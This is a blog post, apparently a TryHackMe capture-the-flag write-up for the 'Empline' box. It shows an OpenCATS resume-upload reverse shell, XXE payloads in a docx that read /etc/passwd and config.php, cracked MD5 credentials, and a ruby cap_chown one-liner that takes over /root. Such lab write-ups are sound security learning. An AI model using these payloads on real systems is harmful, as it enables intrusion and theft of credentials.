@@ -1,0 +1,277 @@
+
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Empline | Mitul Kumar</title>
+  <meta name="description" content="Enumeration">
+  <meta name="author" content="Mitul Kumar">
+  <meta name="theme-color" content="#0c100e">
+  <meta property="og:title" content="Empline | Mitul Kumar">
+  <meta property="og:description" content="Enumeration">
+  <meta property="og:type" content="article">
+  <meta property="og:url" content="https://bl4ck574r.github.io/posts/Empline/">
+  <meta property="article:published_time" content="2022-09-13T02:24:00+05:30">
+  <link rel="canonical" href="https://bl4ck574r.github.io/posts/Empline/">
+  <link rel="icon" type="image/svg+xml" href="/favicon.svg">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;450;500;600;650;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="/styles.css">
+</head>
+<body class="article-page" id="top">
+  <a class="skip-link" href="#content">Skip to article</a>
+  <div class="terminal-bar">
+    <div class="terminal-bar-inner">
+      <span class="window-dots" aria-hidden="true"><i></i><i></i><i></i></span>
+      <a class="terminal-title" href="/" aria-label="Mitul Kumar portfolio">mitul<span class="muted">@</span>portfolio<span class="terminal-path">: ~</span></a>
+      <nav class="site-nav" aria-label="Main navigation">
+        <a href="/">Portfolio</a>
+        <a href="/blog/" aria-current="true">Blog</a>
+      </nav>
+    </div>
+  </div>
+
+  <main class="article-shell" id="content">
+    <a class="article-back" href="/blog/"><span aria-hidden="true">←</span> All posts</a>
+    <article aria-labelledby="article-title">
+      <header class="article-header">
+        <p class="shell-prompt" aria-hidden="true"><span>~/blog</span> $ cat Empline.md</p>
+        <h1 id="article-title">Empline</h1>
+        <div class="article-meta">
+          <span>Mitul Kumar</span>
+          <time datetime="2022-09-13T02:24:00+05:30">13 September 2022</time>
+        </div>
+        
+        <ul class="tags" aria-label="Topics">
+          <li>TryHackMe</li><li>Linux</li>
+        </ul>
+        
+        
+      </header>
+
+      <div class="post-content">
+        <h1 id="enumeration">Enumeration</h1>
+
+<p>Starting with nmap</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+</pre></td><td class="rouge-code"><pre>Host is up <span class="o">(</span>0.17s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   2048 c0:d5:41:ee:a4:d0:83:0c:97:0d:75:cc:7b:10:7f:76 <span class="o">(</span>RSA<span class="o">)</span>
+|   256 83:82:f9:69:19:7d:0d:5c:53:65:d5:54:f6:45:db:74 <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 4f:91:3e:8b:69:69:09:70:0e:82:26:28:5c:84:71:c9 <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp   open  http    Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
+|_http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-title: Empline
+3306/tcp open  mysql   MySQL 5.5.5-10.1.48-MariaDB-0ubuntu0.18.04.1
+| mysql-info: 
+|   Protocol: 10
+|   Version: 5.5.5-10.1.48-MariaDB-0ubuntu0.18.04.1
+|   Thread ID: 96
+|   Capabilities flags: 63487
+|   Some Capabilities: SupportsLoadDataLocal, ConnectWithDatabase, ODBCClient, LongPassword, Support41Auth, Speaks41ProtocolNew, Speaks41ProtocolOld, SupportsTransactions, DontAllowDatabaseTableColumn, FoundRows, IgnoreSigpipes, LongColumnFlag, SupportsCompression, InteractiveClient, IgnoreSpaceBeforeParenthesis, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins
+|   Status: Autocommit
+|   Salt: cM8nEJ&amp;yV~9&gt;l<span class="s1">'xIDZxk
+|_  Auth Plugin Name: mysql_native_password
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 15.35 seconds
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+<p>Looking at the results, we have port 22, 3306 and 80.</p>
+
+<h3 id="port-80">PORT 80</h3>
+
+<p><img src="https://user-images.githubusercontent.com/43528306/138642355-d900a779-6dd5-4f98-8b7a-642c5e7d243d.png" alt="image" /></p>
+
+<p>The website seems almost static except the <code class="language-plaintext highlighter-rouge">Employement</code> tab which points us to <code class="language-plaintext highlighter-rouge">job.empline.thm/careers</code>. We need to add this subdomain to our <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file.</p>
+
+<p>Looking at this subdomain, we found the webserver was running <em>OpenCATS</em>, which is free and open source Application Tracking System. The page also list the current openings and a <em>apply</em> button.</p>
+
+<p><img src="https://user-images.githubusercontent.com/43528306/138642494-2e4bd5e0-90eb-4bf1-9790-54828408558b.png" alt="image" /></p>
+
+<p>Using <code class="language-plaintext highlighter-rouge">Apply to Position</code> button, the application allow us to upload our Resume file and other details to apply for the job.</p>
+
+<h1 id="exploit">Exploit</h1>
+<p>It was exploitable in two ways:</p>
+
+<h2 id="using-uploading-php-shell">Using Uploading PHP shell</h2>
+<p>As the application was written in PHP, we can try to upload a PHP reverse shell using Resume upload functionality. Uploading the Shell and submitting the form, we recieved <code class="language-plaintext highlighter-rouge">Resume was uploaded succesful</code>.</p>
+
+<p>The application being open-source, we can easily find the complete directory structure from Github.<br />
+We found <code class="language-plaintext highlighter-rouge">/upload</code> directory, navigating to <code class="language-plaintext highlighter-rouge">job.empline.thm/upload</code>, we can see our PHP shell was uploaded successfuly, using which we can get a reverse shell.</p>
+
+<h2 id="using-xxe">Using XXE</h2>
+<p>The application was vulnerable to XXE attack as mentioned in this <a href="https://doddsecurity.com/312/xml-external-entity-injection-xxe-in-opencats-applicant-tracking-system/">blogpost</a>, where we can upload are resume.</p>
+
+<p>Docx file are basically zipped XML files. As the application was reading our <em>resume.docx</em> and extracting out the data,
+we can assume that its parsing the whole file to extract data from it. We can create a simple docx using the following code</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre></td><td class="rouge-code"><pre><span class="kn">from</span> <span class="nn">docx</span> <span class="kn">import</span> <span class="n">Document</span>
+
+<span class="n">document</span><span class="o">=</span> <span class="n">Document</span><span class="p">()</span>
+<span class="n">paragraph</span> <span class="o">=</span> <span class="n">document</span><span class="p">.</span><span class="n">add_paragraph</span><span class="p">(</span><span class="s">"Rocklee"</span><span class="p">)</span>
+<span class="n">document</span><span class="p">.</span><span class="n">save</span><span class="p">(</span><span class="s">'resume.docx'</span><span class="p">)</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+<h3 id="creating-malicious-docx">Creating Malicious docx</h3>
+<p>The script created the .docx file, to modify it according to our purpose, we need to change few things in the file. For this,</p>
+<ul>
+  <li>We need to unzip the docx file.</li>
+  <li>Modify the content of <code class="language-plaintext highlighter-rouge">word/document.xml</code>. After first line, add following paylaod:
+    <div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="cp">&lt;!DOCTYPE test [&lt;!ENTITY test SYSTEM 'file:///etc/passwd'&gt;</span>]&gt;
+</pre></td></tr></tbody></table></code></pre></div>    </div>
+  </li>
+  <li>Save the changes</li>
+  <li>Zip the file again with modified contents
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>zip resume.docx word/document.xml
+</pre></td></tr></tbody></table></code></pre></div>    </div>
+  </li>
+</ul>
+
+<p>Upload the file and we have the contents of passwd file.</p>
+
+<p><img src="https://user-images.githubusercontent.com/43528306/138641030-8cda02cf-73bd-4888-9582-7c6be54b2c23.png" alt="image" /></p>
+
+<p>As the application was open-source, from github we found the whole directory structure. Our next task was to extract data from <code class="language-plaintext highlighter-rouge">config.php</code></p>
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="cp">&lt;!DOCTYPE [&lt;!ENTITY test SYSTEM 'php://filter/convert.base64-encode/resource=config.php'&gt;</span>]&gt;
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Using this, we found the credentials to database.</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre></td><td class="rouge-code"><pre><span class="cm">/* Database configuration. */</span>                                                       
+<span class="nb">define</span><span class="p">(</span><span class="s1">'DATABASE_USER'</span><span class="p">,</span> <span class="s1">'james'</span><span class="p">);</span>                                                   
+<span class="nb">define</span><span class="p">(</span><span class="s1">'DATABASE_PASS'</span><span class="p">,</span> <span class="s1">'ng6pUFvsGNtw'</span><span class="p">);</span>                                            
+<span class="nb">define</span><span class="p">(</span><span class="s1">'DATABASE_HOST'</span><span class="p">,</span> <span class="s1">'localhost'</span><span class="p">);</span>                                                                                                                                    
+<span class="nb">define</span><span class="p">(</span><span class="s1">'DATABASE_NAME'</span><span class="p">,</span> <span class="s1">'opencats'</span><span class="p">);</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<h3 id="shell-as-www-data">Shell as www-data</h3>
+<p>We got shell on the box, lets start enumerating the box. Looking at passwd file, we found other users available on the box.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre></td><td class="rouge-code"><pre><span class="nb">cat</span> /etc/passwd | <span class="nb">grep </span>sh<span class="err">$</span>
+root:x:0:0:root:/root:/bin/bash
+ubuntu:x:1001:1001:Ubuntu:/home/ubuntu:/bin/bash
+george:x:1002:1002::/home/george:/bin/bash
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>Looking at the <code class="language-plaintext highlighter-rouge">config.php</code> in web root folder,</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre></td><td class="rouge-code"><pre><span class="cm">/* Database configuration. */</span>                                                       
+<span class="nb">define</span><span class="p">(</span><span class="s1">'DATABASE_USER'</span><span class="p">,</span> <span class="s1">'james'</span><span class="p">);</span>                                                   
+<span class="nb">define</span><span class="p">(</span><span class="s1">'DATABASE_PASS'</span><span class="p">,</span> <span class="s1">'ng6pUFvsGNtw'</span><span class="p">);</span>                                            
+<span class="nb">define</span><span class="p">(</span><span class="s1">'DATABASE_HOST'</span><span class="p">,</span> <span class="s1">'localhost'</span><span class="p">);</span>                                                                                                                                    
+<span class="nb">define</span><span class="p">(</span><span class="s1">'DATABASE_NAME'</span><span class="p">,</span> <span class="s1">'opencats'</span><span class="p">);</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>Config file contains creds for MySQL. As from our nmap scan, we confirm that MySQL was running on the box, we can use the creds to login into MySQL.</p>
+<pre><code class="language-mysql">MariaDB [opencats]&gt; select * from user\G;
+...[snip]...
+*************************** 3. row ***************************
+                  user_id: 1251
+                  site_id: 1
+                user_name: george
+                    email: 
+                 password: 86d0dfda99dbebc424eb4407947356ac
+...[snip]...
+</code></pre>
+<p>The database contains a users table with password and username. The password hash was MD5 which we can easily decrypt using any online service 
+Using crackstation, we found the password <code class="language-plaintext highlighter-rouge">pretonnevippasempre</code></p>
+
+<h3 id="shell-as-george">Shell as George</h3>
+<p>As we already have the password for the user, we can SSH using the creds we found on the box. Now we can read user.txt file.</p>
+
+<p>Running LinPeas, we found capabilities set on <code class="language-plaintext highlighter-rouge">ruby</code>.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td><td class="rouge-code"><pre>george@empline:/<span class="nv">$ </span>getcap <span class="nt">-r</span> / 2&gt;/dev/null 
+/usr/bin/mtr-packet <span class="o">=</span> cap_net_raw+ep
+/usr/local/bin/ruby <span class="o">=</span> cap_chown+ep
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>Ruby was having a capablity of <code class="language-plaintext highlighter-rouge">cap_chown</code>, This capability allow us to change owner of a file. Looking at <a href="https://apidock.com/ruby/File/chown/class">docs</a>, we found a way to do this in ruby which require user-id and gid to which we want to change this to.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td><td class="rouge-code"><pre>george@empline:/dev/shm<span class="nv">$ </span>ruby <span class="nt">-e</span> <span class="s1">'require "fileutils";FileUtils.chown(1002,1002,"/root")'</span>                                                                         
+george@empline:/dev/shm<span class="nv">$ </span><span class="nb">cd</span> /root                                                                                                                                 george@empline:/root<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>                                                                                                                                       total 36                                                                                                                                                           drwx------  4 george george 4096 Jul 20 19:52 <span class="nb">.</span>                                                                                                                   drwxr-xr-x 24 root   root   4096 Oct 25 04:34 ..                                                                                                                   <span class="nt">-rw-------</span>  1 root   root      5 Jul 20 19:52 .bash_history                                                                                                       <span class="nt">-rw-r--r--</span>  1 root   root   3106 Apr  9  2018 .bashrc                                                                                                             drwxr-xr-x  3 root   root   4096 Jul 20 19:49 .local                                                                                                               <span class="nt">-rw-r--r--</span>  1 root   root    148 Aug 17  2015 .profile                                                                                                             drwx------  2 root   root   4096 Jul 20 19:45 .ssh                                                                                                                 <span class="nt">-rw-r--r--</span>  1 root   root    227 Jul 20 19:48 .wget-hsts                                                                                                           <span class="nt">-rw-r--r--</span>  1 root   root     33 Jul 20 19:48 root.txt           
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>We have now changed the permission of <code class="language-plaintext highlighter-rouge">/root</code> directory. From here, we can either grab ssh private keys of root, or we can change the permission of <em>shadow</em> file and the change the root’s password.</p>
+
+<p>ROOT!!</p>
+
+<hr />
+<ul>
+  <li>https://man7.org/linux/man-pages/man7/capabilities.7.html</li>
+</ul>
+
+      </div>
+    </article>
+
+    
+    <nav class="article-pagination" aria-label="More articles">
+      
+      <a href="/posts/Previse/" rel="prev">
+        <span>← Older post</span>
+        <strong>Previse</strong>
+      </a>
+      
+      
+      <a href="/posts/BountyHunter/" rel="next">
+        <span>Newer post →</span>
+        <strong>Bounty Hunter</strong>
+      </a>
+      
+    </nav>
+    
+
+    <footer class="article-footer">
+      <a href="/blog/">← All posts</a>
+      <span>© 2026 Mitul Kumar</span>
+      <a class="back-to-top" href="#top">Back to top ↑</a>
+    </footer>
+  </main>
+</body>
+</html>
